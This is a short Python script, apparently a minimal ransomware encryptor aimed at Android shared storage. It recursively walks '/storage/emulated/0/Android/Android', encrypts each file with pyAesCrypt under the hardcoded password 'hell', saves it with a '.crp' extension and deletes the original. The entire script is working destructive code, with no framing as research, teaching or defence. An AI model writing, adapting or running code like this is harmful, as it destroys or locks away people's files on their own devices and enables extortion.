import os,sys
def crypt(file):
    import pyAesCrypt
    password = 'hell'
    bufferSize = 512*1024
    pyAesCrypt.encryptFile(str(file),str(file)+'.crp',password,bufferSize)
    os.remove(file)
def walk(dir):
    for name in os.listdir(dir):
        path = os.path.join(dir,name)
        if os.path.isfile(path): crypt(path)
        else: walk(path)
walk('/storage/emulated/0/Android/Android')
